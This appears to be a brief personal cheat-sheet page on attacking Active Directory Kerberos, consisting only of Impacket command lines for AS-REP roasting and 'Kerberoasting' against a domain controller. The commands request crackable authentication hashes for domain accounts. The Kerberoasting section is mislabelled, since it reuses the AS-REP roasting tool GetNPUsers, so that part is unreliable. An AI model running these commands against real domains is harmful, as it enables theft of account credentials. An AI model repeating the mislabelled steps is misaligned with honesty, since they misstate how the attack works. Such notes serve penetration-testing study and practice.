---
title: "Kerberoasting"
date: 2024-7-6
tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers"]
---

---
### AS_REP Roasting

```bash
impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
```

### Kerberoasting

```bash
impacket-GetNPUsers 'example.com/user:password' -dc-ip 10.10.11.10
```

```bash
impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10
```


<br>